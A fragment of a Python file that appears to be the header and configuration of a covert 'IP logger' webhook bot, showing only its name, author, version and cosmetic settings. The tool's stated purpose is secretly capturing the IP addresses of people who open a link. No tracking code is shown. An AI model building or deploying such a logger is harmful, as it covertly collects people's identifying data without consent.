...
__app__ = "totally not a ip logger bot"
__description__ = "????"
__version__ = "v2.0"
__author__ = "DeKrypt"
...
config = {
    ...
    # CUSTOMIZATION #
    "username": "totally not a ip logger bot", # Set this to the name you want the webhook to have
    "color": 0x3498DB, # Hex Color you want for the embed (Example: Red is 0xFF0000)
